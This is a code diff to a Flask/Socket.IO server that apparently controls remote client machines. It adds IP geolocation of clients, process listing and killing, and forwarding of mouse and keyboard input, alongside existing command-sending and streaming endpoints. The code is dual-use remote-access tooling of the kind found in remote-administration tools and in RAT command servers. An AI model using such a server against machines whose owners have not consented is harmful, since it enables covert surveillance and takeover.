@@ -32,11 +32,26 @@ def api_clients():
                 'ip': clients.get(cid, {}).get('ip', 'unknown'),
                 'os': clients.get(cid, {}).get('os', 'unknown'),
                 'hostname': clients.get(cid, {}).get('hostname', 'unknown'),
-                'last_seen': clients.get(cid, {}).get('last_seen', 'never')
+                'last_seen': clients.get(cid, {}).get('last_seen', 'never'),
+                'location': clients.get(cid, {}).get('location', {})
             }
             for cid in clients.keys()
         ]
     })
+
+@app.route('/api/clients/<client_id>/location')
+def get_location(client_id):
+    if client_id in clients:
+        ip = clients[client_id]['ip']
+        if ip == '127.0.0.1': return jsonify({'city': 'Localhost', 'country': 'Internal'})
+        try:
+            import requests
+            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+            data = r.json()
+            clients[client_id]['location'] = data
+            return jsonify(data)
+        except: pass
+    return jsonify({'error': 'failed'})
 
 @app.route('/api/clients/<client_id>/cmd', methods=['POST'])
 def send_cmd(client_id):
@@ -177,6 +192,43 @@ def handle_toggle_stream(data):
     client_id = data.get('client_id')
     if client_id and client_id in clients:
         socketio.emit('toggle_stream', data, room=client_id)
+
+@socketio.on('get_processes')
+def handle_get_processes(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('get_processes', data, room=client_id)
+
+@socketio.on('kill_process')
+def handle_kill_process(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('kill_process', data, room=client_id)
+
+# --- Remote Input Forwarding ---
+@socketio.on('mouse_move')
+def handle_mouse_move(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('mouse_move', data, room=client_id)
+
+@socketio.on('mouse_click')
+def handle_mouse_click(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('mouse_click', data, room=client_id)
+
+@socketio.on('key_press')
+def handle_key_press(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('key_press', data, room=client_id)
+
+@socketio.on('scroll')
+def handle_scroll(data):
+    client_id = data.get('client_id')
+    if client_id and client_id in clients:
+        socketio.emit('scroll', data, room=client_id)
 
 @socketio.on('disconnect')
 def handle_disconnect():
